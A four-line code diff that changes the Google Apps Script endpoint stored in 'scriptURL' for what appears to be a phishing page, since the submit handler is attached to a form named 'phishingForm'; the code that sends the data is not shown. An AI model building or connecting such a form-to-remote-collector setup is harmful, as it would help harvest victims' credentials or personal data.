@@ -1,4 +1,4 @@
-const scriptURL = "https://script.google.com/macros/s/AKfycbzBkJ8YjHr8sk7MjSykLDoGQxgRKiOAq8P_srBF97Uxd7MXqWx6XhafXFQYJ5oZyuGoPQ/exec";
+const scriptURL = "https://script.google.com/macros/s/AKfycbxt88h4IH4BdPDQ2ZbG5oB7EIrEXZiX5_zzPzAGmBo-Gjcrd_O288IXazpfiGYycXRtjQ/exec";
 
 document.getElementById("phishingForm").addEventListener("submit", function(event) {
     event.preventDefault();
